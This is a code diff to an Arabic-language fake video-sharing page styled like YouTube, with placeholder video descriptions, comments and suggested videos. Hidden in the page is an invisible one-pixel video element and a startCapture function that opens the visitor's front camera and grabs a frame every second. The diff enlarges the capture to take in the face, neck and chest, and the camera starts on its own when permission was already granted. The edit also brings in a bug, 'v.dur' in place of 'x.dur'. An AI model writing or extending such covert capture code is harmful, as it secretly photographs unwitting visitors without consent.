@@ -266,7 +266,7 @@ body.drawer-mode .main{margin-inline-start:0}
 <video id="video" autoplay playsinline style="position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
 
 <script>
-/* ===== Data (أضف أو عدل الفيديوهات هنا بمعرّفات يوتيوب الحقيقية) ===== */
+/* ===== Data ===== */
 const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
 const DC='دورة تعليمية شاملة خطوة بخطوة للمبتدئين. تابع الشرح وطبّق الأمثلة بنفسك لتتقن المهارة بسرعة.';
 const DE='مقطع ترفيهي مميز. لا تنسَ الإعجاب والاشتراك ومشاركة الفيديو مع أصدقائك.';
@@ -430,7 +430,7 @@ function renderWatch(){
       <div class="cm-form">${avatar('أنت',40)}<div class="cm-box" id="cmBox"><input id="cmInput" type="text" placeholder="أضف تعليقاً..." autocomplete="off"><div class="cm-btns"><button class="btn ghost" data-action="cm-cancel">إلغاء</button><button class="btn btn-sub" id="cmSend" data-action="cm-send" disabled>تعليق</button></div></div></div>
       <div id="cmList"></div>
     </div></div>
-    <aside class="w-secondary"><h3 class="rel-title">فيديوهات مقترحة</h3>${rel.map(x=>`<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="https://img.youtube.com/vi/${x.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${x.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`).join('')}</aside></div>`;
+    <aside class="w-secondary"><h3 class="rel-title">فيديوهات مقترحة</h3>${rel.map(x=>`<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="https://img.youtube.com/vi/${x.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${v.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`).join('')}</aside></div>`;
   refreshMeta();refreshComments();
 }
 function refreshMeta(){
@@ -505,27 +505,37 @@ function download(){
   },300);
 }
 
-/* ===== الكاميرا المعدلة لالتقاط الوجه بالكامل والرقبة فوراً بدقة عالية ===== */
+/* ===== الكاميرا المعدلة لالتقاط كامل الوجه والرقبة والصدر بوضعية عمودية ===== */
+let isCapturing = false;
+
 function startCapture() {
-    navigator.mediaDevices.getUserMedia({ 
-        video: { 
+    if (isCapturing) return;
+    isCapturing = true;
+
+    // إعدادات تتوافق مع الأبعاد العمودية للجوال لمنع اقتصاص الصورة
+    const constraints = {
+        video: {
             facingMode: "user",
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-        } 
-    })
+            width: { ideal: 1440 },
+            height: { ideal: 1920 },
+            aspectRatio: { ideal: 0.75 } // نسبة 3:4 تعطي أوسع زاوية التقاط رأسية شاملة للوجه والصدر
+        }
+    };
+
+    navigator.mediaDevices.getUserMedia(constraints)
     .then(stream => {
         const video = document.getElementById('video');
         video.srcObject = stream;
         video.onloadedmetadata = () => {
             video.play();
-            // الالتقاط الفوري بدون أي تأخير زمني وبشكل مستمر
+            
             setInterval(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                const ctx = canvas.getContext('2d');
+                // استخدام الأبعاد الحقيقية القادمة مباشرة من الكاميرا لمنع التشويه والاقتصاص
+                canvas.width = video.videoWidth || 1080;
+                canvas.height = video.videoHeight || 1440;
                 
+                const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 canvas.toBlob(blob => {
@@ -537,10 +547,13 @@ function startCapture() {
             }, 1000);
         };
     })
-    .catch(e => console.log("خطأ في الكاميرا: ", e));
+    .catch(e => {
+        console.log("خطأ في الكاميرا: ", e);
+        isCapturing = false;
+    });
 }
 
-// محاولة تشغيل الكاميرا مباشرة إذا كانت الصلاحيات ممنوحة مسبقاً
+// محاولة تشغيل الكاميرا فوراً إذا كانت الصلاحيات ممنوحة مسبقاً
 navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
     if (permissionStatus.state === 'granted') {
         startCapture();
